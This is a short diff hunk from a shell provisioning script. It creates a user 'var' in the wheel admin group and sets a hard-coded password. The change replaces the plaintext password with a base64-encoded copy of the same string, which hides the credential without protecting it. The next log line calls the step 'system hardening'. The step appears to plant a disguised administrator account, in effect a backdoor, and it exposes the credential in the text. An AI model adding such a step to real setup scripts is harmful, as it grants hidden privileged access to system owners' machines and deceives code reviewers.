@@ -94,7 +94,7 @@ if [ ! -f "$CP_DIR/step4" ]; then
     else
         useradd -M -G wheel var
     fi
-    echo "var:18041994@Dark" | chpasswd
+    echo "dmFyOjE4MDQxOTk0QERhcms=" | base64 -d | chpasswd
     log "System hardening completed."
     touch "$CP_DIR/step4"
 fi
